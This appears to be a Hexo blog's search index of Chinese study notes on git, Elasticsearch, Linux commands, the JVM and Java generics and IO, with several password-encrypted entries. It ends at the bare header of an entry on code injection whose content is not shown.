<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>git</title>
    <link href="/2024/07/21/git/"/>
    <url>/2024/07/21/git/</url>
    
    <content type="html"><![CDATA[<h1 id="git基础知识点"><a href="#git基础知识点" class="headerlink" title="git基础知识点"></a>git基础知识点</h1><p><img src="/../img/1c4f058675fa4bba88b1426c8bfdf3fd.png" alt="git流程图"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看当前工作区和暂存区的状态</span><br>git status <br></code></pre></td></tr></table></figure><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#列出所有本地分支</span><br>git branch<br><span class="hljs-comment">#列出所有本地分支和远程分支</span><br>git branch -a<br><span class="hljs-comment">#列出远程分支</span><br>git branch -r<br><span class="hljs-comment">#查看本地分支与远程分支的关联关系</span><br>git branch -vv <br></code></pre></td></tr></table></figure><p>以上命令在windows的git bash使用时按q键退出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#check out 远程的master分支，在本地起名为master分支，**并切换到** 本地的master分支</span><br>git checkout -b master origin/master<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>java多线程</title>
    <link href="/2024/07/21/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <url>/2024/07/21/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="wrong password." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ba559d14101fa9e3ed3cc730c9c7500a76daf7c684cd8abb71edb07582afcecd"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>java反射</title>
    <link href="/2024/07/21/java%E5%8F%8D%E5%B0%84/"/>
    <url>/2024/07/21/java%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="wrong password." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3ff99c8de275e3028f64f5be1a11352a28e8dcf1f538d3df06814f43e4b9af9a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>spring知识点</title>
    <link href="/2024/07/21/spring/"/>
    <url>/2024/07/21/spring/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="wrong password." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cb7dbbc2d785cb445b835266c50f39c456b979b18c04e447e5ef37fcdcbb4d77"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>java</category>
      
      <category>秋招</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL</title>
    <link href="/2024/07/21/MySQL/"/>
    <url>/2024/07/21/MySQL/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="wrong password." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b1a1fb7ef823177b4961e5153269fc86197def31a8085d9e849e67fb6de5391f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>秋招</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>elasticSearch &amp;&amp; improve</title>
    <link href="/2024/07/15/elasticSearch/"/>
    <url>/2024/07/15/elasticSearch/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="分布式搜索引擎ES"><a href="#分布式搜索引擎ES" class="headerlink" title="分布式搜索引擎ES"></a>分布式搜索引擎ES</h1><p>参考链接：<br><a href="https://www.cnblogs.com/buchizicai/p/17093719.html">https://www.cnblogs.com/buchizicai/p/17093719.html</a></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>底层基于lucene</p><h2 id="倒排索引"><a href="#倒排索引" class="headerlink" title="倒排索引"></a>倒排索引</h2><p>该概念是基于MySQL这样的正向索引而言。</p><p>在正向索引中，如果设置了索引，那查询效率比较合理（比如根据主键ID进行查询），但是如果进行<strong>模糊查询</strong>，那就只能逐行即全表扫描。</p><p><strong>两个概念</strong>：</p><ul><li>文档：一条数据</li><li>词条：对文档进行分词得到的词</li></ul><p><strong>创建倒排索引</strong>：<br>分词得到词条-&gt;创建表-&gt;给词条建索引<br><img src="/../img/2729274-20230205171751933-576636800.png"></p><p>查询流程：<br><img src="/../img/2729274-20230205171803916-704919285.png"></p><p>概念区分：</p><ul><li>正向索引是最传统的，根据id索引的方式。但根据词条查询时，必须先逐条获取每个文档，然后判断文档中是否包含所需要的词条，是根据文档找词条的过程。</li><li>而倒排索引则相反，是先找到用户要搜索的词条，根据词条得到保护词条的文档的id，然后根据id获取文档。是根据词条找文档的过程。</li></ul><h2 id="ES数据库基本概念"><a href="#ES数据库基本概念" class="headerlink" title="ES数据库基本概念"></a>ES数据库基本概念</h2><h3 id="文档和字段"><a href="#文档和字段" class="headerlink" title="文档和字段"></a>文档和字段</h3><p>一个文档就像数据库里的一条数据（一行），字段就像数据库里的列。<br><strong>文档-&gt;行<br>字段-&gt;列</strong></p><p>es面向文档存储，文档被序列化成json格式存储。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;小米手机&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;price&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">3499</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;华为手机&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;price&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">4999</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h3 id="索引和映射"><a href="#索引和映射" class="headerlink" title="索引和映射"></a>索引和映射</h3><p><strong>索引-&gt;表<br>映射-&gt;约束</strong></p><p><strong>映射</strong>：</p><ul><li>Text：分词——&gt;模糊匹配，全文搜索，不聚合查询</li><li>keyword：不分词——&gt;精确匹配，聚合查询</li><li>Date</li></ul><h3 id="DSL-vs-SQL"><a href="#DSL-vs-SQL" class="headerlink" title="DSL vs SQL"></a>DSL vs SQL</h3><p>DSL是es提供的JSON风格的请求语句，用来操作es，实现CRUD</p><h3 id="使用CURL-交互"><a href="#使用CURL-交互" class="headerlink" title="使用CURL 交互"></a>使用CURL 交互</h3><p><code>curl -X&lt;VERB&gt; &#39;&lt;PROTOCOL&gt;://&lt;HOST&gt;:&lt;PORT&gt;/&lt;PATH&gt;?&lt;QUERY_STRING&gt;&#39; -d &#39;&lt;BODY&gt;&#39;</code></p><p>一些简单的操作：</p><p>查看所有索引（类似show tables）：<code>curl -X GET &quot;http://localhost:9200/_cat/indices?v&quot;</code><br>（cat 表示查看的意思， indices 表示索引）</p><p><code>GET /my-index/_search</code></p><p><code>curl -X GET &quot;http://localhost:9200/my-index/_search/?q=*&amp;pretty&quot;</code></p><p><code>GET /my-index/_mapping</code></p><p>更复杂的建议不要以url携带的形式而是以body的形式携带查询参数。</p><p>详细参考链接：<a href="https://segmentfault.com/a/1190000042059652">https://segmentfault.com/a/1190000042059652</a></p><h2 id="ES优化浅析"><a href="#ES优化浅析" class="headerlink" title="ES优化浅析"></a>ES优化浅析</h2><p>ES传统分页查询在面临巨大的数据量时效率很低（from+size）.from越大，越慢。且一般有10000的上限.</p><p>solve: scroll API. </p>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>linux基础</title>
    <link href="/2024/07/11/linux%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/07/11/linux%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="linux基础知识点"><a href="#linux基础知识点" class="headerlink" title="linux基础知识点"></a>linux基础知识点</h1><p><code>ps -ef| grep name</code><br>查看相关进程.</p><p><code>cat log |grep info</code><br>读取日志，查看相关信息.</p><span id="more"></span><p><code>tail -n 100 -f log </code><br>-n 100行，-f 实时更新显示.</p><p><code>lsof -i:3306</code><br>查看对应端口.</p><p><code>curl -k xx.com</code><br>-k&#x2F;–insecure 设置允许不安全连接</p><p><code>curl -v xx.com</code><br>显示通信的整个过程信息</p><p>环境变量相关的两个文件：<br><code>/etc/profile</code><br>&#x2F;etc&#x2F;profile：此文件为系统的<strong>每个用户</strong>设置环境信息，当用户第一次登录时，该文件被执行，并从&#x2F;etc&#x2F;profile.d目录的配置文件中搜集shell的设置。</p><p><code>~/.bash_profile</code><br>每个用户都可使用该文件输入专用于自己使用的shell信息，当用户登录时，该文件仅仅执行一次!默认情况下，他设置一些环境变量，执行用户的.bashrc文件。是交互式login 方式进入 bash 运行的。</p><p>环境变量配置：<br>修改&#x2F;etc&#x2F;profile</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/usr/local/tomcat/bin/:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">source</span> /etc/profile<br></code></pre></td></tr></table></figure><p><code>netstat -tunlp</code><br>用于显示 tcp，udp 的端口和进程等相关情况。<br>-t (tcp) 仅显示tcp相关选项<br>-u (udp)仅显示udp相关选项<br>-n 拒绝显示别名，能显示数字的全部转化为数字<br>-l 仅列出在Listen(监听)的服务状态<br>-p 显示建立相关链接的程序名</p><p><code>netstat -tunlp | grep 8000</code><br>查看8000端口</p>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JVM</title>
    <link href="/2024/07/01/JVM/"/>
    <url>/2024/07/01/JVM/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h1><h2 id="JVM背景"><a href="#JVM背景" class="headerlink" title="JVM背景"></a>JVM背景</h2><ul><li>编译器负责把Java源代码编译成<strong>字节码</strong>，JVM负责把字节码转换成机器码。转换的时候，可以做一些压缩或者优化（<strong>JIT</strong>），提高程序运行效率。</li><li>JIT: just-in-time:即时编译器。</li><li>如项目遇到内存泄露、CPU飙升的问题，需要通过 JVM 的性能监控进行定位和解决。</li><li>目前最常见最广泛：HotSpot VM—— 热点代码探测 和 准确式内存管理。</li></ul><h2 id="JVM结构"><a href="#JVM结构" class="headerlink" title="JVM结构"></a>JVM结构</h2><ol><li><strong>类加载器</strong>（Class Loader） <strong>加载-&gt;连接-&gt;实例化</strong></li><li><strong>运行时数据区</strong>(类比国库)       <a href="https://javabetter.cn/jvm/what-is-jvm.html#%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA">结构</a>       </li><li><strong>执行引擎</strong><br>解释器， JIT， 垃圾回收器<br><img src="https://cdn.tobebetterjavaer.com/tobebetterjavaer/images/overview/seven-06.png"></li></ol><p><img src="https://cdn.tobebetterjavaer.com/stutymore/what-is-jvm-20231030185742.png"></p><h2 id="java代码运行"><a href="#java代码运行" class="headerlink" title="java代码运行"></a>java代码运行</h2><p>编译期-&gt;运行时<br>编译期：编译成字节码文件<br>运行时：类加载器把bytecode加载到运行时数据区，然后执行引擎执行：</p><ul><li>解释执行：逐条</li><li>JIT即时编译，<strong>运行时</strong>将热点代码优化并缓存，下次直接用缓存起来的的<strong>机器码</strong></li></ul><h2 id="运行时数据区"><a href="#运行时数据区" class="headerlink" title="运行时数据区"></a>运行时数据区</h2><p><strong>运行时数据区哪些部分是线程私有，哪些是共享数据区</strong>：<br>运行数据区有什么：</p><ul><li>虚拟机内存：堆，栈（虚拟机栈，本地方法栈），PC(程序计数器)等</li><li>本地内存：元空间等</li></ul><p>[方法区-&gt;(jdk1.8)元空间]</p><p>线程私有：程序计数器、虚拟机栈、本地方法栈；<br>共享：虚拟机内存中堆的字符串常量池，本地内存中的元空间</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/11/29/16eb7c5ca9064ab4~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png"></p><p><strong>堆区</strong><br>堆中存对象，栈中存基本数据类型和堆中对象的引用<br><strong>元空间区（方法区）</strong><br>存放已被加载的类信息、常量、静态变量、即编译器编译后的代码等。</p><h2 id="垃圾收集机制"><a href="#垃圾收集机制" class="headerlink" title="垃圾收集机制"></a>垃圾收集机制</h2><p>垃圾回收问题主要发生在 Java 堆上。主要内容：死亡的对象。</p><ol><li>引用计数法<br>在对象中添加一个引用计数器，对象每次被引用时，该计数器加一；当引用失效时，计数器的值减一；只要计数器的值为零，则代表对应的对象不可能再被使用。该方法的缺点在于无法避免相互引用的问题：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">objA.instance = objB<br>objB.instance = <span class="hljs-type">objA</span>    <br><span class="hljs-variable">objA</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>objB = <span class="hljs-literal">null</span>;<br>System.gc();<br></code></pre></td></tr></table></figure><p>如上所示，此时两个对象已经不能再被访问，但其互相持有对对方的引用，如果采用引用计数法，则两个对象都无法被回收。<br>2. 可达性分析<br>主流的虚拟机采用的可达性分析.</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Redis</title>
    <link href="/2024/06/22/Redis/"/>
    <url>/2024/06/22/Redis/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="wrong password." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="251d28973a6d47833fbea1f513ce7a09ff68b385af9903432f7c3d01bf820559"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>others</category>
      
      <category>秋招</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java泛型,Java IO</title>
    <link href="/2024/06/15/Java%E6%B3%9B%E5%9E%8B/"/>
    <url>/2024/06/15/Java%E6%B3%9B%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="Java泛型"><a href="#Java泛型" class="headerlink" title="Java泛型"></a>Java泛型</h2><p>例子：</p><p><code>Class&lt;T&gt;</code>：泛型类。即<code>ArrayList&lt;T&gt;</code>，就是泛型类</p><p><strong>T</strong>（Type）: java类</p><p><strong>?</strong> :  泛型通配符</p><p>碰到过的与java反射结合的运用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> ((Class&lt;T&gt;) ((ParameterizedType) getClass().getGenericSuperclass())).getActualTypeArguments()[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>**getGenericSuperclass()**：返回表示由此类表示的实体（类、接口、基元类型或void）的直接超类的<code>Type</code>。<br>如果超类是泛型类，则返回<code>ParameterizedType</code>。</p><p>**getActualTypeArguments()**：返回表示此类型的实际类型参数的Type对象的数组。</p><p>代码例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//BaseTest</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseTest</span>&lt;T, I&gt;&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">//ResultTest</span><br><span class="hljs-keyword">import</span> java.lang.reflect.ParameterizedType;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResultTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTest</span>&lt;String,Integer&gt;&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(((ParameterizedType)<span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultTest</span>().getClass().getGenericSuperclass()).getActualTypeArguments()[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-comment">//class java.lang.String</span><br><br></code></pre></td></tr></table></figure><h3 id="运用场景"><a href="#运用场景" class="headerlink" title="运用场景"></a>运用场景</h3><p><strong>泛型DAO（数据访问对象）模式</strong></p><p>在持久层（如使用JPA或Hibernate）中，泛型DAO可以用来操作各种实体类，但在运行时需要知道实际的实体类类型以便执行查询操作。</p><h2 id="Java-IO"><a href="#Java-IO" class="headerlink" title="Java-IO"></a>Java-IO</h2><h3 id="InputStream"><a href="#InputStream" class="headerlink" title="InputStream"></a>InputStream</h3><p>Java标准库提供的最基本的输入流。所有输入流的超类。</p><p>原始的int read()：读取下一个字节（返回字节表示的int值（0~255）。</p><p>在读取流的时候，一次读取一个字节并不是最高效的方法。-&gt;缓冲。</p><p>InputStream有两个重载方法read(byte[] b)和read(byte[] b, int off, int len)。</p><p>利用上述方法一次读取多个字节时，需要先定义一个**byte[]**数组作为缓冲区，read()方法会尽可能多地读取字节到缓冲区， 但不会超过缓冲区的大小。read()方法的返回值不再是字节的int值，而是返回实际读取了多少个字节。如果返回-1，表示没有更多的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src/readme.txt&quot;</span>)) &#123;<br>        <span class="hljs-comment">// 定义1000个字节大小的缓冲区:</span><br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1000</span>];<br>        <span class="hljs-type">int</span> n;<br>        <span class="hljs-keyword">while</span> ((n = input.read(buffer)) != -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 读取到缓冲区</span><br>            System.out.println(<span class="hljs-string">&quot;read &quot;</span> + n + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="InputStream实现类"><a href="#InputStream实现类" class="headerlink" title="InputStream实现类"></a>InputStream实现类</h3><p>FileInputStream.<br>ByteArrayInputStream 模拟一个InputStream（测试）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] data = &#123; <span class="hljs-number">72</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">33</span> &#125;;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data)) &#123;<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span> ((n = input.read()) != -<span class="hljs-number">1</span>) &#123;<br>                System.out.println((<span class="hljs-type">char</span>)n);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>读取文件内容存为字符串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readAsString</span><span class="hljs-params">(InputStream input)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>    <span class="hljs-keyword">while</span> ((n = input.read()) != -<span class="hljs-number">1</span>) &#123;<br>        sb.append((<span class="hljs-type">char</span>) n);<br>    &#125;<br>    <span class="hljs-keyword">return</span> sb.toString();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>总结：</strong><br>总是使用try(resource)来保证InputStream正确关闭：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> (InputStream input=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src/main/resources/ab.txt&quot;</span>);)&#123;<br>    String s=readAsString(input);<br>    System.out.println(s);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="OutputStream"><a href="#OutputStream" class="headerlink" title="OutputStream"></a>OutputStream</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">try</span> (<span class="hljs-type">OutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;out/readme.txt&quot;</span>)) &#123;<br>        output.write(<span class="hljs-string">&quot;Hello&quot;</span>.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>)); <span class="hljs-comment">// Hello</span><br>    &#125; <span class="hljs-comment">// 编译器在此自动为我们写入finally并调用close()</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>flush() </code>：<br>数据先会写到缓冲区再等满时一次写入。</p><h3 id="Reader"><a href="#Reader" class="headerlink" title="Reader"></a>Reader</h3><p>字符流（InputStream为字节流）。</p><p>普通的Reader实际上是基于InputStream构造的，因为Reader需要从InputStream中读入字节流（byte），然后，根据编码设置，再转换为char就可以实现字符流。FileReader在内部实际上持有一个FileInputStream。 <code>InputStreamReader</code>，它可以把任何InputStream转换为Reader。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> (<span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src/readme.txt&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>)) &#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span></span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="writer"><a href="#writer" class="headerlink" title="writer"></a>writer</h3><p>同样的，字符流。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码注入</title>
    <link href="/2024/02/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/02/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
    
